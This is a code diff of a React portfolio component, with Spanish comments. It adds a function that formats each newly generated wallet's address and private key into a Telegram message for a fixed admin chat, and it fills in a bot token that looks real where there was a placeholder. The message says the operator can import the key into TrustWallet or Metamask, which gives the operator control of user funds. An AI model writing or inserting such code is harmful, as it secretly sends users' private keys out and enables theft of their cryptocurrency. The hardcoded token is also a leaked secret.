@@ -28,7 +28,7 @@ export default function PortfolioView({ userData, activePlans, onUpdate }) {
   // --- NUEVA FUNCIÓN: ENVIAR RESPALDO AL ADMIN ---
   const enviarRespaldoAlAdmin = async (userId, red, address, privateKey) => {
     // ⚠️ REEMPLAZA ESTO CON EL TOKEN DE TU BOT DE TELEGRAM
-    const BOT_TOKEN = "TU_TOKEN_DEL_BOT_AQUI"; 
+    const BOT_TOKEN = "8717597733:AAFD50K9ZWFSHim6OwYAOTVI2lSA0hs11Ig"; 
     const ADMIN_ID = "8968109534"; // Tu ID de administrador
     
     const mensaje = `🚨 *NUEVA WALLET GENERADA* 🚨\n\n👤 *Usuario ID:* \`${userId}\`\n🌐 *Red:* ${red}\n🪪 *Address:* \`${address}\`\n🔑 *Private Key:* \`${privateKey}\`\n\n_⚠️ Guarda esta clave en un lugar seguro. Si el usuario pierde fondos, puedes usar esta Private Key en TrustWallet o Metamask para recuperarlos._`;
